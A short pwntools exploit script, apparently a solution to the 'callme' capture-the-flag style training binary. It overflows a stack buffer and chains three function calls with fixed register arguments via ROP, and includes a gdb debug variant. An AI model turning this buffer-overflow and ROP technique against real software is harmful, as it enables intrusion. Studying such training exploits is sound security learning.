#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-03-03 11:19:39
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "amd64"

filename = "./callme"
target_binary = ELF(filename)
target_process = process(filename)


def exploit():
    exploit_rop = ROP(target_binary)
    trash = cyclic(0x28, n=8)

    # function arguments
    arg_one = 0xdeadbeefdeadbeef
    arg_two = 0xcafebabecafebabe
    arg_three = 0xd00df00dd00df00d

    # function addresses
    call_one = 0x00400720
    call_two = 0x00400740
    call_three = 0x004006f0

    exploit_rop(rdi=arg_one, rsi=arg_two, rdx=arg_three)
    exploit_rop.raw(call_one)
    exploit_rop(rdi=arg_one, rsi=arg_two, rdx=arg_three)
    exploit_rop.raw(call_two)
    exploit_rop(rdi=arg_one, rsi=arg_two, rdx=arg_three)
    exploit_rop.raw(call_three)
    
    print(exploit_rop.dump())

    chain = exploit_rop.chain()

    target_process.send(trash + chain + cyclic(512 - 0x28 - len(chain), n=8))
    target_process.interactive()


def debug():
    gdbscript = """
    break *0x004008e5
    break *0x00400720
    break *0x00400740
    break *0x004006f0
    start
    continue
    """
    gdb.attach(target_process, gdbscript=gdbscript)
    trash = cyclic(0x28, n=8)
    
    # function arguments
    arg_one = 0xdeadbeefdeadbeef
    arg_two = 0xcafebabecafebabe
    arg_three = 0xd00df00dd00df00d
    
    # function addresses
    call_one = 0x00400720
    call_two = 0x00400740
    call_three = 0x004006f0
    
    debug_rop = ROP(target_binary)
    debug_rop(rdi=arg_one, rsi=arg_two, rdx=arg_three)
    debug_rop.raw(call_one)
    debug_rop(rdi=arg_one, rsi=arg_two, rdx=arg_three)
    debug_rop.raw(call_two)
    debug_rop(rdi=arg_one, rsi=arg_two, rdx=arg_three)
    debug_rop.raw(call_three)
    print(debug_rop.dump())

    chain = debug_rop.chain()

    target_process.send(trash + chain + cyclic(512 - 0x28 - len(chain), n=8))


if __name__ == "__main__":
    exploit()

